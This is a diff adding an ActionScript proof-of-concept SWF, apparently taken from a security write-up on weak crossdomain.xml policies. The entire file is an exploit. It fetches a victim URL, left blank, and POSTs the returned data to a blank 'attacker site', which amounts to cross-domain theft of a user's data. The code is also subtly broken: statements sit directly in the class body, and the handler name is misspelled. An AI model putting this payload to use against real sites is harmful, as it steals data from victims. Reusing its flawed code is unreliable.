@@ -1,0 +1,39 @@
+// crossdomain.xml file exploitation SWF file from http://paladion.net/weak-crossdomain-xml-and-its-exploitation-poc/
+
+package {
+  import flash.display.Sprite;
+  import flash.events.*;
+  import flash.net.URLRequestMethod;
+  import flash.net.URLRequest;
+  import flash.net.URLLoader;
+
+  public class flasher extends Sprite {
+    var readFrom:String = ""; // The target (victim) URL.
+    var readRequest:URLRequest = new URLRequest(readFrom);
+    var getLoader:URLLoader = new URLLoader();
+    getLoader.addEventListener(Event.COMPLETE, eventHandler);
+    try
+    {
+      getLoader.load(readRequest);
+    }
+    catch (error:Error)
+    {
+    }
+  }
+
+  private function eventHandelr(event:Event):void
+  {
+    var sendTo:String = "" // Attacker site, where data will be sent.
+    var sendRequest:URLRequest = new URLRequest(sendTo);
+    sendRequest.method = URLRequestMethod.POST;
+    sendRequest.data = event.target.data;
+    var sendLoader:URLLoader = new URLLoader();
+    try
+    {
+      sendLoader.load(sendRequest);
+    }
+    catch (error:Error)
+    {
+    }
+  }
+}
